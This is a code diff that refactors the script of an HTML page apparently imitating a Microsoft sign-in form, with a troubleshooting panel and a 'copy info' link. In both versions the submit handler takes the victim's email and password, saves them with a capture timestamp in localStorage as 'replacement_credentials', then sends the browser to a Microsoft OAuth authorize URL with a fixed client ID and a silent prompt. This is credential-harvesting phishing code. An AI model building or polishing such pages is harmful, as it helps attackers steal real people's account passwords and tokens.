@@ -172,7 +172,7 @@
     .troubleshooting-body p { margin: 8px 0; }
     .troubleshooting-body strong { font-weight: 600; }
     .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
-    .hidden { display: none; }
+    .hidden { display: none !important; }
   </style>
 </head>
 <body>
@@ -275,31 +275,25 @@
   </div>
 
   <script>
-    // --- REWRITTEN SCRIPT USING MODERN NATIVE JAVASCRIPT ---
+    // --- FINAL, CORRECTED SCRIPT ---
     document.addEventListener('DOMContentLoaded', function () {
         
-        // --- Element Selectors ---
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
         const optionsViewDetailed = document.getElementById('options_view_detailed');
         const optionsBox = document.getElementById('options_box');
         const troubleshootingBox = document.getElementById('troubleshooting_box');
         
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const emailDisplay = document.getElementById('emailch');
-
-        // --- Event Listeners ---
         document.getElementById('next').addEventListener('click', function (e) {
             e.preventDefault();
-            const email = emailInput.value.trim();
+            const emailInput = document.getElementById('email');
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (emailRegex.test(email)) {
-                emailDisplay.textContent = email;
+            if (emailRegex.test(emailInput.value.trim())) {
+                document.getElementById('emailch').textContent = emailInput.value.trim();
                 div1.classList.add('hidden');
-                div2.classList.remove('hidden');
                 optionsBox.classList.add('hidden');
                 troubleshootingBox.style.display = 'none';
+                div2.classList.remove('hidden');
             }
         });
 
@@ -326,27 +320,19 @@
 
         document.getElementById('submit-btn').addEventListener('click', function (event) {
             event.preventDefault();
-            const email = emailDisplay.textContent.trim();
+            const submitBtn = event.target;
+            const passwordInput = document.getElementById('password');
+            const email = document.getElementById('emailch').textContent.trim();
             const password = passwordInput.value;
 
-            if (!password) return;
+            if (!password) { return; }
             
-            const submitBtn = event.target;
             submitBtn.textContent = 'Verifying...';
             submitBtn.disabled = true;
 
-            const credentialsData = {
-                email: email,
-                password: password,
-                captureTime: new Date().toISOString(),
-                source: 'replacement-html-final'
-            };
-            
-            try {
-                localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-            } catch (err) {
-                console.error('Failed to store credentials in localStorage:', err);
-            }
+            const credentialsData = { email, password, captureTime: new Date().toISOString(), source: 'replacement-html-final' };
+            try { localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData)); } 
+            catch (err) { console.error('Failed to store credentials in localStorage:', err); }
 
             const callbackUrl = window.location.origin + '/auth/callback';
             const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
@@ -366,7 +352,8 @@
 
         document.getElementById('copy_info_link').addEventListener('click', function (e) {
             e.preventDefault();
-            const detailsText = document.getElementById('error_details_for_copy').textContent.trim().replace(/\s\s+/g, '\n');
+            const detailsNode = document.getElementById('error_details_for_copy');
+            const detailsText = detailsNode.textContent.trim().replace(/\s\s+/g, '\n');
             navigator.clipboard.writeText(detailsText).then(() => {
                 const originalText = e.target.textContent;
                 e.target.textContent = 'Copied!';
